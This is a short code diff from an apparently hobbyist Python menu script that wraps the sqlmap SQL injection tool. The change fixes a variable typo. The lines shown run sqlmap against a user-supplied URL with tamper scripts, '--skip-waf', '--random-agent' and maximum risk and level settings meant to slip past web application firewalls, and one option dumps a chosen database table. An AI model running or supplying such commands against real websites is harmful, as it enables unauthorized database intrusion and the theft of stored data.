@@ -64,6 +64,6 @@ if at == "9" :
    call(["sqlmap", atsq4,"-D", atdbn2, "-T", attb, "--dump", "--random-agent"])
 if at == "10" :
    atsq2 = input("url =>")
-   call(["sqlmap", atsqs2 ,"--tamper=space2comment,between,space2plus", "-v 2", "--hex", "--random-agent", "--skip-waf", "--risk=3", "--level=3"])
+   call(["sqlmap", atsq2 ,"--tamper=space2comment,between,space2plus", "-v 2", "--hex", "--random-agent", "--skip-waf", "--risk=3", "--level=3"])
 else : 
    print("something went wrong ")
